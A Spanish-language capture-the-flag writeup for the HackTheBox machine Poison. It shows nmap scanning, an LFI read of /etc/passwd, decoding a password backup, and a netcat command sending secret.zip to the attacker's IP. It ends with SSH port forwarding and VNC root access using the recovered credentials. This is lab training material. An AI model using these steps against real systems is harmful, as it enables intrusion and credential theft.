---
title:  "Poison Writeup [ES] - HackTheBox"
date:   2021-11-09 17:00:00 -0300
categories: [HTB]
toc: true
comments: false
tags: [medium, log-poisoning, vnc, port-forwarding]
---

[Poison](https://app.hackthebox.com/machines/132) es una máquina **FreeBSD** de dificultad media ofrecida por la plataforma de [Hack The Box](https://app.hackthebox.com/). A lo largo de este post encontrarás un writeup indicando la forma de como rootearla.


## Información


![Info](/images/HTB/Poison/01-info.png)


## Enumeración

### NMAP

Como siempre, se iniciará realizando un escaneo general de los 65535 puertos.

* ```nmap -sS --min-rate 5000 -p- -n -v 10.10.10.9 -oG allPorts.gnmap```

```plaintext
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-10 00:23 -03
Stats: 0:02:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for 10.10.10.84
Host is up (0.14s latency).
Not shown: 36848 filtered ports, 28685 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 149.69 seconds
```

Posteriormente se realiza un escaner más exhaustivo para conocer servicios y versiones asociados a los puertos abiertos encontrados.

* ```nmap -sC -sV -p22,80 -n -oN ports.nmap 10.10.10.84```

```plaintext
Nmap scan report for 10.10.10.84
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey:
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Nov  9 18:53:50 2021 -- 1 IP address (1 host up) scanned in 12.33 seconds
```
* Resumen puertos

| Puerto    | Estado  | Servicio                           |
|-----------|---------|------------------------------------|
| 22/tcp    | Abierto | OpenSSH 7.2 - FreeBSD              |
| 80/tcp    | Abierto | Apache httpd 2.4.29                |


## Ganando acceso

### Método 1

El ganar acceso a esta máquina es bastante trivial, ya que al entrar al sitio web expuesto, se verá lo siguiente.

![](/images/HTB/Poison/10-website.png)

Se visualiza un sitio web bastante simple que permite leer archivos locales de la máquina. Esto hace pensar inmediatamente que puede existir LFI.

Al hacer una consulta al archivo ```ini.php``` como se sugiere, en la URL se lista la petición hecha a través de la variable ```file```.

![](/images/HTB/Poison/15-lfi.png)

Yendo un poco más allá, se puede intentar pasarle a ```file``` un archivo de sistema para validar si es posible leerlo. En este caso lo más común sería intentar listar ```/etc/passwd```.

![](/images/HTB/Poison/20-etc-passwd.png)

Efectivamente se puede leer, sin necesidad de aplicar **Path Traversal** y se obtiene un usuario del sistema.

Antes de seguir listando otros archivos del sistema, se procederá a revisar los archivos que recomendaba la web inicial, uno de ellos es ```listfiles.php```.

![](/images/HTB/Poison/25-pwdbackup.png)

este archivo, como dice su propio nombre, listará todos los archivos del directorio actual y acá es donde se ve un recurso de interés: ```pwdbackup.txt```. Al leerlo se verá que contiene una contraseña cifrada posiblemente en **base64** y al menos 13 veces como indica el texto.

![](/images/HTB/Poison/30-pwd-encoded.png)

Por el momento se guardará esta cadena en el archivo ```encoded-pass.txt```.

```bash
cat encoded-pass.txt

Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=
```

Para esto lo más cómodo será crear un script simple que realice la decodificación de esta cadena.

* ```decode``` bash script.

```bash
#!/bin/bash

if [ -z "$1" ]; then
  echo -e "\n[!] Please provide file to read."
  echo -e "\nUsage: ./$(basename $0) mybase64encodedfile.txt"
  exit 0
fi

password=$(cat $1)

for i in {1..13}
do
  password=$(echo "$password" | base64 -d)
done

echo "$password"
```

![](/images/HTB/Poison/35-pwd-decoded.png)

Con esto se obtiene la contraseña: ```Charix!2#4%6&8(0```, y recordando lo revisado anteriormente, se tiene un usuario del sistema con el que probar si es posible entrar por **SSH**.

![](/images/HTB/Poison/40-ssh-login.png)

### Método 2 - Log Poisoning



## Escalando privilegios

Ahora toca la fase de reconocimiento dentro de la máquina para buscar vías potenciales para la escalada de privilegios. Revisando el directorio home del user ya se visualiza la flag un archivo interesante: ```secret.zip```.

![](/images/HTB/Poison/42-files.png)


![](/images/HTB/Poison/43-cannot-unzip.png)

Al intentar descomprimir, aparece un mensaje indicando que es necesario proporcionar una contraseña pero no permite ingresarla. Debido a esto lo que se puede hacer es mover este **.zip** a la máquina atacante para intentar descomprimirlo. 

En este caso hay varias opciones, pero en esta ocasión se usará **netcat** para la transferencia de archivos.

* Máquina víctima: ```nc -v 10.10.14.12 443 < secret.zip```.
* Máquina atacante: ```nc -nvlp 443 > secret.zip```.

![](/images/HTB/Poison/45-nc-transfer.png)

Ya en posesión del ```.zip``` lo primero a intentar será la contraseña del user **charix**.

![](/images/HTB/Poison/50-unzip-secret.png)

Efectivamente la clave es válida pero la descompresión entrega un archivo con contenido ilegible y la herramienta ```file``` no proporciona mayor información.

Continuando con la enumeración, al listar procesos se visualiza algo interesante.

* Listar procesos: ```ps -faux```.

![](/images/HTB/Poison/60-ps-faux.png)

Al parecer hay un servicio de **VNC** corriendo con el usuario **root**. Esta es una vía potencial para escalar privilegios si se pudiera entrar a la sesión de VNC activa, el problema es que el puerto **5901/tcp** para la conexión a **VNC** está cerrado desde la máquina víctima. 

Para solventar lo anterior, se puede utilizar **SSH** para realizar un port forwarding.

### Port fordwarding

En este caso, se realizará un forwarding del puerto 5901(VNC) de la máquina Poison, hacia el puerto 8000 de la máquina local. De manera que cuando se consulte el puerto 8000 localmente, este tráfico llegará a Poison con el puerto 5901

* ```sshpass -p 'Charix!2#4%6&8(0' ssh charix@10.10.10.84 -L 8000:127.0.0.1:5901```

Este comando iniciará una sesión SSH para la replicación de los puertos mencionados anteriormente, y mientras dure este proceso, se mantendrá la conexión. En el caso de que se requiera hacer lo mismo sin conectarse por consola, se puede emitir en segundo plano.

* ```sshpass -p 'Charix!2#4%6&8(0' ssh charix@10.10.10.84 -L 8000:127.0.0.1:5901 -Nf```

![](/images/HTB/Poison/65-port-fordwarding.png)

### Conexión VNC

Ya teniendo el port fordwarding establecido, se puede testear la conexión al puerto con un cliente VNC.


![](/images/HTB/Poison/70-vnc-cx.png)

Se ingresa la password conseguida anteriormente sin tener éxito: ```Charix!2#4%6&8(0```.

![](/images/HTB/Poison/75-vnc-cx2.png)

Al buscar otras alternativas y revisar la ayuda de ```vncviewer``` se identifica una opción interesante que permite conectar a través de un archivo de autenticación.

![](/images/HTB/Poison/80-vnc-passwd.png)

Volviendo atrás, se había conseguido un archivo que parecía estar cifrado, por lo que se podría usar este archivo ```secret``` para intentar una autenticación contra VNC.

![](/images/HTB/Poison/90-vnc-connected.png)

Y efectivamente el archivo permitió la conexión remota hacia la sesión VNC y paralelamente se abre la ventana, mostrando una consola bajo el conexto de **root**.

![](/images/HTB/Poison/95-vnc-desktop.png)

Con esto ya estaría rooteada la máquina Poison y solo restaría buscar y leer las flags.